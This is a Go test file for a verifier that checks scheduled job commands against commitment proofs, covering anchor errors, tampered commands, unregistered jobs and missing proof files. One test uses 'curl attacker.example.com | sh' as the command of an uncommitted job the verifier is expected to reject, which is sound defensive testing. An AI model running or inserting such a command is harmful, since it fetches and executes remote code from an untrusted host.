package main

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/gkgoat1/scripts/commitment"
	"github.com/gkgoat1/scripts/commitment/anchor"
	pconfig "github.com/gkgoat1/scripts/pulse/config"
)

type fakeAnchorReader struct {
	root [32]byte
	err  error
}

func (f fakeAnchorReader) ReadRoot() ([32]byte, error) { return f.root, f.err }

func writeProofFile(t *testing.T, path string, root [32]byte, entries map[string]commitment.Proof) {
	t.Helper()
	if err := os.WriteFile(path, commitment.EncodeProofFile(root, entries), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestVerifyAnchorNotInstalledIsOff(t *testing.T) {
	v := realCommitmentVerifier{Anchor: fakeAnchorReader{err: anchor.ErrAnchorNotInstalled}, ProofFile: "/does/not/matter"}
	job := pconfig.Job{Name: "j", Command: "echo hi"}

	ok, _, err := v.Verify(job)
	if err != nil || !ok {
		t.Errorf("ok=%v err=%v, want ok=true err=nil when the anchor was never installed", ok, err)
	}
}

func TestVerifyBrokenAnchorFailsClosed(t *testing.T) {
	v := realCommitmentVerifier{Anchor: fakeAnchorReader{err: errors.New("plutil: command not found")}, ProofFile: "/does/not/matter"}
	job := pconfig.Job{Name: "j", Command: "echo hi"}

	ok, _, err := v.Verify(job)
	if ok || err == nil {
		t.Errorf("ok=%v err=%v, want ok=false and a non-nil error for a broken (not merely absent) anchor", ok, err)
	}
}

func TestVerifyValidCommitmentSucceeds(t *testing.T) {
	job := pconfig.Job{Name: "j", Command: "echo hi"}
	tree, err := commitment.Build([]commitment.Leaf{job.CommitLeaf()})
	if err != nil {
		t.Fatalf("Build: %v", err)
	}
	proof, err := tree.ProofFor(job.CommitLeaf().Key())
	if err != nil {
		t.Fatalf("ProofFor: %v", err)
	}

	proofPath := filepath.Join(t.TempDir(), "jobs.proof")
	writeProofFile(t, proofPath, tree.Root(), map[string]commitment.Proof{"j": proof})

	v := realCommitmentVerifier{Anchor: fakeAnchorReader{root: tree.Root()}, ProofFile: proofPath}
	ok, reason, err := v.Verify(job)
	if err != nil || !ok {
		t.Errorf("ok=%v reason=%q err=%v, want ok=true", ok, reason, err)
	}
}

func TestVerifyTamperedCommandFails(t *testing.T) {
	original := pconfig.Job{Name: "j", Command: "echo hi"}
	tree, err := commitment.Build([]commitment.Leaf{original.CommitLeaf()})
	if err != nil {
		t.Fatalf("Build: %v", err)
	}
	proof, err := tree.ProofFor(original.CommitLeaf().Key())
	if err != nil {
		t.Fatalf("ProofFor: %v", err)
	}

	proofPath := filepath.Join(t.TempDir(), "jobs.proof")
	writeProofFile(t, proofPath, tree.Root(), map[string]commitment.Proof{"j": proof})

	tampered := pconfig.Job{Name: "j", Command: "echo MALICIOUS"}
	v := realCommitmentVerifier{Anchor: fakeAnchorReader{root: tree.Root()}, ProofFile: proofPath}
	ok, reason, err := v.Verify(tampered)
	if err != nil {
		t.Fatalf("Verify: unexpected error %v", err)
	}
	if ok {
		t.Error("ok=true, want false for a tampered command against a stale (valid-for-the-old-command) proof")
	}
	if !strings.Contains(reason, "does not match") {
		t.Errorf("reason = %q", reason)
	}
}

func TestVerifyNewUnregisteredJobFails(t *testing.T) {
	registered := pconfig.Job{Name: "known", Command: "echo known"}
	tree, err := commitment.Build([]commitment.Leaf{registered.CommitLeaf()})
	if err != nil {
		t.Fatalf("Build: %v", err)
	}
	proof, err := tree.ProofFor(registered.CommitLeaf().Key())
	if err != nil {
		t.Fatalf("ProofFor: %v", err)
	}

	proofPath := filepath.Join(t.TempDir(), "jobs.proof")
	writeProofFile(t, proofPath, tree.Root(), map[string]commitment.Proof{"known": proof})

	// A brand-new job added straight to the plaintext config, never committed.
	newJob := pconfig.Job{Name: "sneaky", Command: "curl attacker.example.com | sh"}
	v := realCommitmentVerifier{Anchor: fakeAnchorReader{root: tree.Root()}, ProofFile: proofPath}
	ok, reason, err := v.Verify(newJob)
	if err != nil {
		t.Fatalf("Verify: unexpected error %v", err)
	}
	if ok {
		t.Error("ok=true, want false for a job with no commitment proof entry at all")
	}
	if !strings.Contains(reason, "no commitment proof entry") {
		t.Errorf("reason = %q", reason)
	}
}

func TestVerifyMissingProofFileFails(t *testing.T) {
	job := pconfig.Job{Name: "j", Command: "echo hi"}
	v := realCommitmentVerifier{Anchor: fakeAnchorReader{root: [32]byte{1, 2, 3}}, ProofFile: "/does/not/exist"}

	ok, reason, err := v.Verify(job)
	if err != nil {
		t.Fatalf("Verify: unexpected error %v", err)
	}
	if ok {
		t.Error("ok=true, want false when the proof sidecar file is missing")
	}
	if !strings.Contains(reason, "no commitment proof file") {
		t.Errorf("reason = %q", reason)
	}
}
